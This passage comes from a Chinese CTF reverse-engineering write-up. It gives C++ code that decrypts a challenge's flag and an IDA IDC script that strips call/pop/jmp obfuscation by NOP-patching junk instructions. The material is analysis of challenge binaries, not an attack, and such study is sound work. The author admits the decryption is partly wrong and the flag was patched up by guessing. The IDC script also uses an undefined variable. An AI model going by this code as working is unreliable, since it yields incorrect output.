Input<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span> <span class="token operator">^=</span> <span class="token number">6</span><span class="token punctuation">;</span>
Input<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">^=</span> <span class="token number">5</span><span class="token punctuation">;</span>
Input<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">-=</span> <span class="token number">8</span><span class="token punctuation">;</span>
Input<span class="token punctuation">[</span><span class="token number">27</span><span class="token punctuation">]</span> <span class="token operator">^=</span> <span class="token number">7</span><span class="token punctuation">;</span>
Input<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span> <span class="token operator">^=</span> <span class="token number">6</span><span class="token punctuation">;</span>
Input<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span> <span class="token operator">^=</span> <span class="token number">4</span><span class="token punctuation">;</span>
Input<span class="token punctuation">[</span><span class="token number">23</span><span class="token punctuation">]</span> <span class="token operator">^=</span> <span class="token number">12</span><span class="token punctuation">;</span>
Input<span class="token punctuation">[</span><span class="token number">34</span><span class="token punctuation">]</span> <span class="token operator">^=</span> <span class="token number">14</span><span class="token punctuation">;</span>
Input<span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">52</span><span class="token punctuation">;</span>
Input<span class="token punctuation">[</span><span class="token number">38</span><span class="token punctuation">]</span> <span class="token operator">-=</span> <span class="token number">119</span><span class="token punctuation">;</span></code></pre>

<p>这也就是第一层加密的解密代码。</p>
<p>第二层加密直接对着写即可，我写的有点问题（懒得改），其中几个字节解密不对，不过根据解密出的flag也能猜出是啥，替换完那几个字节就得到完整的flag。</p>
<p>完整解密代码：</p>
<pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;windows.h></span></span>

<span class="token keyword">void</span> <span class="token function">decrypt_func</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token operator">*</span>data<span class="token punctuation">,</span> <span class="token keyword">int</span> len<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">unsigned</span> <span class="token keyword">char</span> temp<span class="token punctuation">[</span><span class="token number">40</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token function">memcpy</span><span class="token punctuation">(</span>temp<span class="token punctuation">,</span> data<span class="token punctuation">,</span> <span class="token number">40</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">10</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token keyword">int</span> base <span class="token operator">=</span> <span class="token number">4</span> <span class="token operator">*</span> i<span class="token punctuation">;</span>
        <span class="token keyword">unsigned</span> <span class="token keyword">char</span> block<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

        <span class="token keyword">if</span> <span class="token punctuation">(</span>base <span class="token operator">&lt;</span> len<span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>
            block<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>temp<span class="token punctuation">[</span>base <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">&amp;</span> <span class="token number">0x1F</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>temp<span class="token punctuation">[</span>base <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">>></span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            block<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>temp<span class="token punctuation">[</span>base<span class="token punctuation">]</span> <span class="token operator">>></span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>temp<span class="token punctuation">[</span>base <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">&amp;</span> <span class="token number">0x07</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            block<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>temp<span class="token punctuation">[</span>base<span class="token punctuation">]</span> <span class="token operator">&amp;</span> <span class="token number">0x07</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>temp<span class="token punctuation">[</span>base <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">>></span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            block<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>temp<span class="token punctuation">[</span>base <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">&amp;</span> <span class="token number">0x07</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>temp<span class="token punctuation">[</span>base <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">>></span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> <span class="token number">4</span> <span class="token operator">&amp;&amp;</span> base <span class="token operator">+</span> j <span class="token operator">&lt;</span> len<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span>
            <span class="token punctuation">&#123;</span>
                data<span class="token punctuation">[</span>base <span class="token operator">+</span> j<span class="token punctuation">]</span> <span class="token operator">=</span> block<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">unsigned</span> <span class="token keyword">char</span> Input<span class="token punctuation">[</span><span class="token number">48</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
        <span class="token number">0x4A</span><span class="token punctuation">,</span> <span class="token number">0xAB</span><span class="token punctuation">,</span> <span class="token number">0x9B</span><span class="token punctuation">,</span> <span class="token number">0x1B</span><span class="token punctuation">,</span> <span class="token number">0x61</span><span class="token punctuation">,</span> <span class="token number">0xB1</span><span class="token punctuation">,</span> <span class="token number">0xF3</span><span class="token punctuation">,</span> <span class="token number">0x32</span><span class="token punctuation">,</span> <span class="token number">0xD1</span><span class="token punctuation">,</span> <span class="token number">0x8B</span><span class="token punctuation">,</span> <span class="token number">0x73</span><span class="token punctuation">,</span> <span class="token number">0xEB</span><span class="token punctuation">,</span> <span class="token number">0xE9</span><span class="token punctuation">,</span> <span class="token number">0x73</span><span class="token punctuation">,</span> <span class="token number">0x6B</span><span class="token punctuation">,</span> <span class="token number">0x22</span><span class="token punctuation">,</span>
        <span class="token number">0x81</span><span class="token punctuation">,</span> <span class="token number">0x83</span><span class="token punctuation">,</span> <span class="token number">0x23</span><span class="token punctuation">,</span> <span class="token number">0x31</span><span class="token punctuation">,</span> <span class="token number">0xCB</span><span class="token punctuation">,</span> <span class="token number">0x1B</span><span class="token punctuation">,</span> <span class="token number">0x22</span><span class="token punctuation">,</span> <span class="token number">0xFB</span><span class="token punctuation">,</span> <span class="token number">0x25</span><span class="token punctuation">,</span> <span class="token number">0xC2</span><span class="token punctuation">,</span> <span class="token number">0x81</span><span class="token punctuation">,</span> <span class="token number">0x81</span><span class="token punctuation">,</span> <span class="token number">0x73</span><span class="token punctuation">,</span> <span class="token number">0x22</span><span class="token punctuation">,</span> <span class="token number">0xFA</span><span class="token punctuation">,</span> <span class="token number">0x03</span><span class="token punctuation">,</span>
        <span class="token number">0x9C</span><span class="token punctuation">,</span> <span class="token number">0x4B</span><span class="token punctuation">,</span> <span class="token number">0x5B</span><span class="token punctuation">,</span> <span class="token number">0x49</span><span class="token punctuation">,</span> <span class="token number">0x97</span><span class="token punctuation">,</span> <span class="token number">0x87</span><span class="token punctuation">,</span> <span class="token number">0xDB</span><span class="token punctuation">,</span> <span class="token number">0x51</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

    <span class="token function">decrypt_func</span><span class="token punctuation">(</span>Input<span class="token punctuation">,</span> <span class="token number">40</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    Input<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">12</span><span class="token punctuation">;</span>
    Input<span class="token punctuation">[</span><span class="token number">26</span><span class="token punctuation">]</span> <span class="token operator">-=</span> <span class="token number">85</span><span class="token punctuation">;</span>
    Input<span class="token punctuation">[</span><span class="token number">35</span><span class="token punctuation">]</span> <span class="token operator">-=</span> <span class="token number">12</span><span class="token punctuation">;</span>
    Input<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">9</span><span class="token punctuation">;</span>
    Input<span class="token punctuation">[</span><span class="token number">27</span><span class="token punctuation">]</span> <span class="token operator">-=</span> <span class="token number">6</span><span class="token punctuation">;</span>
    Input<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">^=</span> <span class="token number">5</span><span class="token punctuation">;</span>
    Input<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">^=</span> <span class="token number">5</span><span class="token punctuation">;</span>
    Input<span class="token punctuation">[</span><span class="token number">27</span><span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">14</span><span class="token punctuation">;</span>
    Input<span class="token punctuation">[</span><span class="token number">25</span><span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">3</span><span class="token punctuation">;</span>
    Input<span class="token punctuation">[</span><span class="token number">26</span><span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">4</span><span class="token punctuation">;</span>
    Input<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">^=</span> <span class="token number">8</span><span class="token punctuation">;</span>
    Input<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">-=</span> <span class="token number">12</span><span class="token punctuation">;</span>
    Input<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">10</span><span class="token punctuation">;</span>
    Input<span class="token punctuation">[</span><span class="token number">37</span><span class="token punctuation">]</span> <span class="token operator">-=</span> <span class="token number">2</span><span class="token punctuation">;</span>
    Input<span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">]</span> <span class="token operator">-=</span> <span class="token number">2</span><span class="token punctuation">;</span>
    Input<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span> <span class="token operator">-=</span> <span class="token number">12</span><span class="token punctuation">;</span>
    Input<span class="token punctuation">[</span><span class="token number">26</span><span class="token punctuation">]</span> <span class="token operator">^=</span> <span class="token number">5</span><span class="token punctuation">;</span>
    Input<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">13</span><span class="token punctuation">;</span>
    Input<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">^=</span> <span class="token number">15</span><span class="token punctuation">;</span>
    Input<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">14</span><span class="token punctuation">;</span>
    Input<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span> <span class="token operator">-=</span> <span class="token number">7</span><span class="token punctuation">;</span>
    Input<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span> <span class="token operator">-=</span> <span class="token number">7</span><span class="token punctuation">;</span>
    Input<span class="token punctuation">[</span><span class="token number">34</span><span class="token punctuation">]</span> <span class="token operator">^=</span> <span class="token number">8</span><span class="token punctuation">;</span>
    Input<span class="token punctuation">[</span><span class="token number">21</span><span class="token punctuation">]</span> <span class="token operator">^=</span> <span class="token number">10</span><span class="token punctuation">;</span>
    Input<span class="token punctuation">[</span><span class="token number">39</span><span class="token punctuation">]</span> <span class="token operator">-=</span> <span class="token number">126</span><span class="token punctuation">;</span>
    Input<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">2</span><span class="token punctuation">;</span>
    Input<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span> <span class="token operator">^=</span> <span class="token number">3</span><span class="token punctuation">;</span>
    Input<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">^=</span> <span class="token number">10</span><span class="token punctuation">;</span>
    Input<span class="token punctuation">[</span><span class="token number">34</span><span class="token punctuation">]</span> <span class="token operator">-=</span> <span class="token number">11</span><span class="token punctuation">;</span>
    Input<span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">8</span><span class="token punctuation">;</span>
    Input<span class="token punctuation">[</span><span class="token number">25</span><span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">9</span><span class="token punctuation">;</span>
    Input<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span> <span class="token operator">^=</span> <span class="token number">6</span><span class="token punctuation">;</span>
    Input<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">^=</span> <span class="token number">5</span><span class="token punctuation">;</span>
    Input<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">-=</span> <span class="token number">8</span><span class="token punctuation">;</span>
    Input<span class="token punctuation">[</span><span class="token number">27</span><span class="token punctuation">]</span> <span class="token operator">^=</span> <span class="token number">7</span><span class="token punctuation">;</span>
    Input<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span> <span class="token operator">^=</span> <span class="token number">6</span><span class="token punctuation">;</span>
    Input<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span> <span class="token operator">^=</span> <span class="token number">4</span><span class="token punctuation">;</span>
    Input<span class="token punctuation">[</span><span class="token number">23</span><span class="token punctuation">]</span> <span class="token operator">^=</span> <span class="token number">12</span><span class="token punctuation">;</span>
    Input<span class="token punctuation">[</span><span class="token number">34</span><span class="token punctuation">]</span> <span class="token operator">^=</span> <span class="token number">14</span><span class="token punctuation">;</span>
    Input<span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">52</span><span class="token punctuation">;</span>
    Input<span class="token punctuation">[</span><span class="token number">38</span><span class="token punctuation">]</span> <span class="token operator">-=</span> <span class="token number">119</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%.40s\n"</span><span class="token punctuation">,</span> Input<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">// flag&#123;L3@rn-ng_1n_0ld_sch00b_@nd_g3x_j0y&#125; -> flag&#123;L3@rn1ng_1n_0ld_sch00l_@nd_g3t_j0y&#125;</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>flag{L3@rn1ng_1n_0ld_sch00l_@nd_g3t_j0y}</p>
<h3 id="EzObf"><a href="#EzObf" class="headerlink" title="EzObf"></a>EzObf</h3><p>main_0函数跟入发现有混淆，红框处为原真实汇编指令，其他都是混淆指令。</p>
<p>混淆流程：</p>
<ol>
<li>执行真实指令</li>
<li>call $+5执行pop rax，rax就是call时push到栈的返回地址，也就是pop rax指令的地址。</li>
<li>给ebx赋值，进行rol计算，最后用rax加上或减去（共两种）rbx，得到跳转地址，进行jmp rax。</li>
</ol>
<p>之后每jmp过去一次，那边就都是一样的结构，popfq和pushfq之间就是真实汇编。</p>
<p>deobf的思路即为nop那一堆pop和push，保留真实汇编指令，然后计算跳转地址，手动计算相对地址写jmp，保持代码执行流程。</p>
<p><img src="/images/43-1744626745338-47.png" loading="lazy"></p>
<p>deobf idc脚本：</p>
<pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">static</span> <span class="token function">NopCode</span><span class="token punctuation">(</span>Addr<span class="token punctuation">,</span> Length<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">auto</span> i<span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> Length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token function">PatchByte</span><span class="token punctuation">(</span>Addr <span class="token operator">+</span> i<span class="token punctuation">,</span> <span class="token number">0x90</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">static</span> <span class="token function">rol</span><span class="token punctuation">(</span>value<span class="token punctuation">,</span> count<span class="token punctuation">,</span> bits <span class="token operator">=</span> <span class="token number">32</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    count <span class="token operator">=</span> count <span class="token operator">%</span> bits<span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token generic-function"><span class="token function">value</span> <span class="token generic class-name"><span class="token operator">&lt;&lt;</span> count<span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>value <span class="token operator">>></span></span></span> <span class="token punctuation">(</span>bits <span class="token operator">-</span> count<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">&lt;&lt;</span> bits<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token comment">// 搜索真实汇编代码的下一个地址</span>
<span class="token keyword">static</span> <span class="token function">FindEnd</span><span class="token punctuation">(</span>Addr<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">auto</span> i<span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">0x90</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token keyword">auto</span> v <span class="token operator">=</span> <span class="token function">Dword</span><span class="token punctuation">(</span>Addr <span class="token operator">+</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>v <span class="token operator">==</span> <span class="token number">0x5153509C</span><span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>
            <span class="token keyword">return</span> Addr <span class="token operator">+</span> i<span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token comment">// 搜索最后的jmp rax指令</span>
<span class="token keyword">static</span> <span class="token function">FindJmpRax</span><span class="token punctuation">(</span>Addr<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">auto</span> i<span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">0x90</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token keyword">auto</span> v <span class="token operator">=</span> <span class="token function">Word</span><span class="token punctuation">(</span>Addr <span class="token operator">+</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>v <span class="token operator">==</span> <span class="token number">0xE0FF</span><span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>
            <span class="token keyword">return</span> Addr <span class="token operator">+</span> i<span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token comment">// 搜索call $+5</span>
<span class="token keyword">static</span> <span class="token function">FindCall</span><span class="token punctuation">(</span>Addr<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">auto</span> i<span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">0x90</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token keyword">auto</span> v <span class="token operator">=</span> <span class="token function">Dword</span><span class="token punctuation">(</span>Addr <span class="token operator">+</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>v <span class="token operator">==</span> <span class="token number">0xE8</span><span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>
            <span class="token keyword">return</span> Addr <span class="token operator">+</span> i<span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">static</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">auto</span> StartAddr <span class="token operator">=</span> <span class="token number">0x1401F400D</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token comment">// 搜索真实汇编代码的下一个指令地址</span>
        <span class="token keyword">auto</span> EndAddr <span class="token operator">=</span> <span class="token function">FindEnd</span><span class="token punctuation">(</span>StartAddr<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>EndAddr <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>
            <span class="token keyword">break</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token comment">// 真实汇编代码的字节长度</span>
        <span class="token keyword">auto</span> CodeLength <span class="token operator">=</span> EndAddr <span class="token operator">-</span> addr <span class="token operator">-</span> <span class="token number">13</span><span class="token punctuation">;</span>
        <span class="token comment">// 搜索Call $+5</span>
        <span class="token keyword">auto</span> CallAddr <span class="token operator">=</span> <span class="token function">FindCall</span><span class="token punctuation">(</span>addr <span class="token operator">+</span> <span class="token number">13</span> <span class="token operator">+</span> CodeLength<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>CallAddr <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>
            <span class="token keyword">break</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token comment">// call $+5的下一条指令地址，即call时push到栈的返回地址</span>
        <span class="token keyword">auto</span> CalcAddr <span class="token operator">=</span> CallAddr <span class="token operator">+</span> <span class="token number">5</span><span class="token punctuation">;</span>
        <span class="token keyword">auto</span> ebx <span class="token operator">=</span> <span class="token function">Dword</span><span class="token punctuation">(</span>CalcAddr <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">auto</span> rol_Value <span class="token operator">=</span> <span class="token function">Byte</span><span class="token punctuation">(</span>CalcAddr <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">auto</span> Mode <span class="token operator">=</span> <span class="token function">Dword</span><span class="token punctuation">(</span>CalcAddr <span class="token operator">+</span> <span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        ebx <span class="token operator">=</span> <span class="token function">rol</span><span class="token punctuation">(</span>ebx<span class="token punctuation">,</span> rol_Value<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// 搜索最尾部的jmp rax指令地址</span>
        <span class="token keyword">auto</span> JmpRaxAddr <span class="token operator">=</span> <span class="token function">FindJmpRax</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>JmpRaxAddr <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>
            <span class="token keyword">break</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token comment">// 第一部分垃圾指令长度</span>
        <span class="token keyword">auto</span> TrushCodeLength_1 <span class="token operator">=</span> CallAddr <span class="token operator">-</span> <span class="token punctuation">(</span>addr <span class="token operator">+</span> <span class="token number">13</span> <span class="token operator">+</span> CodeLength<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">// 第二部分垃圾指令长度</span>
        <span class="token keyword">auto</span> TrushCodeLength_2 <span class="token operator">=</span> JmpRaxAddr <span class="token operator">-</span> CallAddr <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">;</span>
        <span class="token comment">// Nop掉无用的所有代码</span>
        <span class="token function">NopCode</span><span class="token punctuation">(</span>CallAddr<span class="token punctuation">,</span> TrushCodeLength_2<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token function">NopCode</span><span class="token punctuation">(</span>addr<span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token function">NopCode</span><span class="token punctuation">(</span>addr <span class="token operator">+</span> <span class="token number">13</span> <span class="token operator">+</span> CodeLength<span class="token punctuation">,</span> TrushCodeLength_1<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">// 一共两种地址计算，加和减</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>Mode <span class="token operator">==</span> <span class="token number">0xffC32B48</span><span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>
            CalcAddr <span class="token operator">=</span> CalcAddr <span class="token operator">-</span> ebx<span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>Mode <span class="token operator">==</span> <span class="token number">0xffC30348</span><span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>
            CalcAddr <span class="token operator">=</span> CalcAddr <span class="token operator">+</span> ebx<span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">auto</span> JmpCodeAddr <span class="token operator">=</span> EndAddr<span class="token punctuation">;</span>
        <span class="token comment">// 计算相对跳转地址</span>
        <span class="token keyword">auto</span> JmpOffset <span class="token operator">=</span> CalcAddr <span class="token operator">-</span> JmpCodeAddr <span class="token operator">+</span> <span class="token number">5</span><span class="token punctuation">;</span>
        <span class="token comment">// 写入jmp指令</span>
        <span class="token function">PatchByte</span><span class="token punctuation">(</span>JmpCodeAddr<span class="token punctuation">,</span> <span class="token number">0xE9</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">PatchDword</span><span class="token punctuation">(</span>JmpCodeAddr <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> JmpOffset<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">// jmp的地址为下一次deobf起始地址</span>
        addr <span class="token operator">=</span> CalcAddr<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>执行完，把main_0剩余代码都手动nop即可。</p>
<p><img src="/images/44-1744626745338-49.png" loading="lazy"></p>
<p>然后Apply patches to input file，应用一下patch，重新打开ida载入程序分析。</p>
<p>从main_0的jmp进入两层到这边，然后用IDA Delete Function删除sub_1401F7B77函数，然后对jmp那边按E即可重新重构完main函数（如图2），F5即可分析。</p>
<p><img src="/images/45-1744626745338-50.png" loading="lazy"></p>
<p><img src="/images/46-1744626745338-51.png" loading="lazy"></p>
<p>Main函数原代码：</p>
